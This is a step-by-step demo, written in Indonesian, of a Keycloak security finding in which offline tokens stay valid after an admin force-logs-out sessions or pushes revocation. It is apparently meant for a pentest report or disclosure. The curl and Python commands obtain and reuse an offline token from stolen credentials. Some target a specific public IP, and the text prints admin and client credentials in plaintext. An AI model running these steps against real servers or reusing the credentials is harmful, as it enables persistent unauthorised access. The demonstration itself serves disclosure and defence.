# Tutorial: Finding #3 — Offline Token Persistence After Admin Revocation

**Severity:** HIGH (CVSS 7.5)
**Waktu demo:** ~8 menit
**Kebutuhan:** Terminal + Browser (Admin Console)

---

## Skenario Serangan

1. **Attacker** mencuri password user → dapat offline token
2. **Security team** mendeteksi breach → admin force logout semua session
3. **Attacker** masih bisa akses karena offline token tidak ter-revoke!

---

## Langkah 0: Pastikan Keycloak Berjalan

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Langkah 1: (ATTACKER) Login dan Dapatkan Offline Token

Attacker menggunakan kredensial yang sudah dicuri:

```bash
OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=offline_access")

echo "$OFFLINE_RESP" | python3 -m json.tool | head -10
```

Simpan offline token:
```bash
OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
echo "Offline token: ${OFFLINE_TOKEN:0:60}..."
```

Verifikasi tipe token = "Offline":
```bash
echo "$OFFLINE_RESP" | python3 -c "
import sys,json,base64
d = json.load(sys.stdin)
payload = d['refresh_token'].split('.')[1] + '=='
claims = json.loads(base64.b64decode(payload))
print('Token type:', claims.get('typ'))
"
```
Output: `Token type: Offline`

---

## Langkah 2: (ATTACKER) Verifikasi Token Berfungsi

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('Token valid:', 'access_token' in d)"
```
Output: `Token valid: True`

> Attacker berhasil mendapat access token baru menggunakan offline token.

---

## Langkah 3: (ADMIN) Deteksi Breach — Force Logout Semua Session

### 3a. Via Admin Console (Browser):
1. Buka: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Pilih realm **test**
4. Klik **Users** → cari **testuser** → klik
5. Tab **Sessions** → klik **Sign out all sessions** (atau **Logout all sessions**)

### 3b. Atau via CLI:

```bash
# Dapatkan admin token
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Dapatkan user ID
USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")
echo "User ID: $USER_ID"

# Force logout semua session
curl -s -o /dev/null -w "Force logout: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/logout"
```
Output: `Force logout: HTTP 204` (sukses)

Verifikasi session aktif sudah hilang:
```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/sessions" \
  | python3 -c "import sys,json; print('Active sessions:', len(json.load(sys.stdin)))"
```
Output: `Active sessions: 0`

> Admin berhasil logout semua session. Seharusnya aman kan?

---

## Langkah 4: (ATTACKER) Test Offline Token — MASIH BERFUNGSI!

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('SETELAH FORCE LOGOUT:'); print('Token masih valid:', 'access_token' in d)"
```

**Output (VULNERABLE):**
```
SETELAH FORCE LOGOUT:
Token masih valid: True
```

> **OFFLINE TOKEN MASIH BERFUNGSI** meskipun admin sudah force logout!

---

## Langkah 5: (ADMIN) Push Not-Before Revocation

Admin coba cara lain — push revocation policy:

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/push-revocation"
```
Output: `{}`

---

## Langkah 6: (ATTACKER) Test Lagi — MASIH BERFUNGSI!

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('SETELAH PUSH REVOCATION:'); print('Token masih valid:', 'access_token' in d)"
```

**Output (VULNERABLE):**
```
SETELAH PUSH REVOCATION:
Token masih valid: True
```

---

## Langkah 7: (ADMIN) Coba DELETE Offline Session — GAGAL 404!

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

CLIENT_UUID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=test-confidential" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

curl -s -o /dev/null -w "DELETE offline sessions: HTTP %{http_code}\n" -X DELETE \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/offline-sessions/$CLIENT_UUID"
```

**Output (VULNERABLE):**
```
DELETE offline sessions: HTTP 404
```

> Admin REST API tidak bisa delete offline sessions — endpoint return 404!

---

## Langkah 8: Tunjukkan Offline Session Masih Ada

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/offline-sessions/$CLIENT_UUID" \
  | python3 -c "import sys,json; sessions=json.load(sys.stdin); print(f'Offline sessions aktif: {len(sessions)}')"
```

Output: `Offline sessions aktif: X` (X > 0)

---

## Langkah 9: Jalankan Python PoC (Otomatis Semua)

```bash
python3 pocs/poc_f3_offline_token.py --host http://localhost:8080
```

---

## Ringkasan

| Aksi Admin | Efek pada Offline Token | Status |
|---|---|---|
| Force logout (`POST /users/{id}/logout`) | **Tidak ada efek** — token masih valid | VULNERABLE |
| Push revocation (`POST /push-revocation`) | **Tidak ada efek** — token masih valid | VULNERABLE |
| DELETE offline session | **HTTP 404** — endpoint tidak berfungsi | VULNERABLE |
| **Ganti password user** | Token ter-revoke | Satu-satunya mitigasi |

**Kesimpulan:** Offline token memberikan akses PERMANEN yang tidak bisa di-revoke oleh admin melalui cara apapun kecuali mengganti password user.
